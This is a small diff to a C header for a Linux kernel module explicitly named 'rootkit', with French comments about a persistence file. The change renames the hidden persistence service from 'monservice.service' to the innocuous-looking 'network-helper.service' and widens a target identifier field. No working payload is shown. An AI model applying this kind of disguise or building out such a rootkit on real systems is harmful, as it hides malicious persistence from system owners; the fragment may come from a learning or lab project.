@@ -22,7 +22,7 @@
 #define RK_MAGIC 0xDE
 #define MCOUNT_INSN_SIZE 5
 #define NAME_MODULE "rootkit"
-#define HIDDEN_SCRIPT "monservice.service"
+#define HIDDEN_SCRIPT "network-helper.service"
 #define RK_MSG_MAX 256
 
 /* TODO: definir le chemin du fichier de persistance sur ta LFS */
@@ -37,7 +37,7 @@ extern char rk_msg[RK_MSG_MAX];
 
 /* Structure d'arguments passee a chaque commande */
 struct rk_args {
-    unsigned int target;   /* PID, UID, ou autre identifiant */
+    unsigned long target;
     unsigned int value;    /* parametre supplementaire selon la commande */
 };
 
